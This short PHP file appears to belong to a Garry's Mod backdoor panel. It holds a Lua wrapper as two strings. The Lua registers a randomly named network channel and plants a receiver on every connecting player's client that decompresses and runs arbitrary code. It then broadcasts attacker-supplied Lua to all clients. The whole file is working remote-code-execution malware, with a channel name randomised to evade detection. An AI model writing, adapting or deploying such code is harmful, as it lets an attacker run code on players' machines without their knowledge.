<?php 

$clientside_start = 'local function rdm_str(len)
	if !len or len <= 0 then return \'\' end
	return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "ifyouseethisdontpanicitsme",function(ply)
	if !ply:IsBot() then
		ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
	end
end)

local function SendToClient(code)
	timer.Simple(0.1, function()
		local data = util.Compress(code)
		local len = #data
		net.Start(net_string)
		net.WriteUInt(len, 16)
		net.WriteData(data, len)
		net.Broadcast()
	end)
end

SendToClient([====[';

$clientside_end = ']====])';

?>
